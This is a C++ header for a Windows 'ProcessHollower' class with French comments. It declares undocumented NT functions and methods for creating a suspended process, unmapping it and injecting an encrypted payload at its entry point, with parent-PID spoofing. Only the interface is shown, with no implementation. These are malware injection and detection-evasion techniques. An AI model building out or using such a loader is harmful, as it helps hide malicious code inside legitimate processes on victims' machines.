#ifndef PROCESS_HOLLOWER_H
#define PROCESS_HOLLOWER_H

#include <windows.h>
#include <winternl.h>
#include <cstdint>
#include <vector>
#include "easCipher42.hpp"

// NTSTATUS declarations
extern "C" {
    __declspec(dllimport) NTSTATUS NTAPI NtQueryInformationProcess(
        HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation, ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    __declspec(dllimport) NTSTATUS NTAPI NtUnmapViewOfSection(
        HANDLE ProcessHandle, PVOID BaseAddress
    );
}

class ProcessHollower {
private:
    HANDLE hProcess = nullptr;
    HANDLE hThread = nullptr;
    DWORD processId = 0;
    DWORD parent_pid = 0;  // PPID à spoofier (0 = pas de spoof)
    bool verbose = false;

    bool create_suspended_process(const wchar_t* target_path);

public:
    ProcessHollower(bool verbose_mode = false, DWORD ppid = 0) : verbose(verbose_mode), parent_pid(ppid) {}
    ~ProcessHollower();

    // Hollowing: create suspended + PE entry point injection
    bool HollowProcess(const wchar_t* target_exe, const std::vector<uint8_t>& payload);

    void SetParentPID(DWORD ppid) { parent_pid = ppid; }

    bool IsValid() const { return hProcess && hProcess != INVALID_HANDLE_VALUE; }
};

#endif
